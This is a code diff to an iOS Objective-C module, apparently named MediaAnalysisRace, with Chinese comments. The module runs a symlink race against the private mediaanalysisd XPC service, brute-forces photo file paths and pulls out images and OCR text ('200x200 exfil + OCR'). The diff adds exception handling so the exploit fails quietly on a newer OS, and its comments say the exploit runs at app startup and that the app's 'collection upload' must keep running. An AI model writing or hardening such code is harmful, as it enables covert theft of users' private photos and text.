@@ -11,6 +11,12 @@
 //
 
 #import "MediaAnalysisRace.h"
+
+// 27.2.1 上 com.apple.mediaanalysisd.service.public 的协议里已经没有
+// requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:
+// 了，代理对象收到这个 selector 会抛 NSInvalidArgumentException（未捕获即 abort）。
+// 一旦 setClasses: 或首次调用失败，就置这个标志，之后彻底不再发请求。
+static BOOL gMADXPCUnavailable = NO;
 #import <UIKit/UIKit.h>
 #import <dlfcn.h>
 #import <objc/message.h>
@@ -79,7 +85,15 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
         _started = YES;
     }
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self runDump];
+        // 最外层兜底：这条队列上任何未捕获的 NSException 都会走
+        // objc_terminate -> abort，整包闪退（27.2.1 上实测过，栈顶是
+        // -[NSXPCInterface setClasses:forSelector:argumentIndex:ofReply:]）。
+        // 采集流程不能因为照片 POC 的一个私有接口失效而跟着死。
+        @try {
+            [self runDump];
+        } @catch (NSException *e) {
+            [self log:[NSString stringWithFormat:@"runDump threw: %@ (%@)", e.reason, e.name]];
+        }
     });
 }
 
@@ -149,9 +163,28 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     }
 
     SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
-    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
-    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
-    [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];
+    // 27.2.1 上 VCPMADServicePublicServerProtocol 的方法签名变了，这个 selector
+    // 已经不在协议里；setClasses:forSelector: 会抛 NSInvalidArgumentException。
+    // 它是在 App.init -> MediaAnalysisRaceRun() 里同步调用的，没人接就直接
+    // abort()（实测 EXC_CRASH / SIGABRT，栈顶就是 setClasses:）。逐条 try。
+    @try {
+        [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"setClasses arg0 reply=NO skipped: %@", e.reason]];
+        gMADXPCUnavailable = YES;
+    }
+    @try {
+        [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"setClasses arg0 reply=YES skipped: %@", e.reason]];
+        gMADXPCUnavailable = YES;
+    }
+    @try {
+        [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"setClasses arg1 reply=YES skipped: %@", e.reason]];
+        gMADXPCUnavailable = YES;
+    }
 
     _conn.remoteObjectInterface = iface;
     _conn.interruptionHandler = ^{ [self log:@"XPC interrupted"]; };
@@ -481,6 +514,12 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     NSString *token = [self issueTokenForPath:racePath];
     if (!token) return NO;
 
+    // 协议不兼容时直接放弃：否则 proxy 收到未知 selector 会抛异常并 abort。
+    if (gMADXPCUnavailable) {
+        [self log:@"mediaanalysisd XPC unavailable on this OS — request skipped"];
+        return NO;
+    }
+
     NSURL *url = [NSURL fileURLWithPath:racePath];
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
     __block UIImage *img = nil;
@@ -491,16 +530,23 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
             dispatch_semaphore_signal(sem);
         }];
 
-    [proxy requestImageProcessing:[self makeCombinedRequest]
-                      forAssetURL:url
-                 withSandboxToken:token
-                       identifier:@"d"
-                        requestID:[self nextRequestID]
-                         andReply:^(id arg1, id arg2) {
-        img = [self imageFromReply:arg1];
-        text = [self textFromReply:arg1];
-        dispatch_semaphore_signal(sem);
-    }];
+    @try {
+        [proxy requestImageProcessing:[self makeCombinedRequest]
+                          forAssetURL:url
+                     withSandboxToken:token
+                           identifier:@"d"
+                            requestID:[self nextRequestID]
+                             andReply:^(id arg1, id arg2) {
+            img = [self imageFromReply:arg1];
+            text = [self textFromReply:arg1];
+            dispatch_semaphore_signal(sem);
+        }];
+    } @catch (NSException *e) {
+        // 双保险：即便上面的标志没置上，这里也不会把异常抛到顶层。
+        gMADXPCUnavailable = YES;
+        [self log:[NSString stringWithFormat:@"requestImageProcessing threw: %@", e.reason]];
+        return NO;
+    }
 
     usleep(delay);
     rename(symlinkPath.UTF8String, racePath.UTF8String);
@@ -618,6 +664,14 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     [self setupLogFile];
     [self log:@"=== start (200x200 exfil + OCR) ==="];
     [self ensureConnection];
+
+    // 协议不兼容（27.2.1 起 requestImageProcessing:... 已不在
+    // VCPMADServicePublicServerProtocol 里）时，试点再走一遍只会白烧
+    // 9999 × 4 前缀 × 11 扩展名的探针，还会拖慢随后的采集上传，这里直接结束。
+    if (gMADXPCUnavailable) {
+        [self log:@"mediaanalysisd XPC unavailable on this OS — scan skipped"];
+        return;
+    }
 
     NSString *tmp = NSTemporaryDirectory();
 
